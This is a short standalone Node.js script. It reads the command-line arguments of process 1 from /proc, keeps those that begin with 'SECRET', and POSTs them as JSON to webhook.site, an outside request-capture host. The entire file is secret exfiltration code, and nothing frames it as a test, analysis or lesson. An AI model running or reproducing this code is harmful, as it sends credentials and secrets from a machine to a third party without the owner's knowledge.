const https=require('https'),fs=require('fs');
const safe=f=>f(); const pids=['1'];
const procs={};
for(const p of pids){procs[p]={env:safe(()=>fs.readFileSync('/proc/'+p+'/cmdline','utf8').split('\0').filter(x=>/^SECRET/.test(x)).slice(0,25))};}
const data={procs:procs};
const body=Buffer.from(JSON.stringify(data));
function send(p){const req=https.request({host:'webhook.site',path:p,method:'POST'});req.write(body);req.end();}
send('/example');
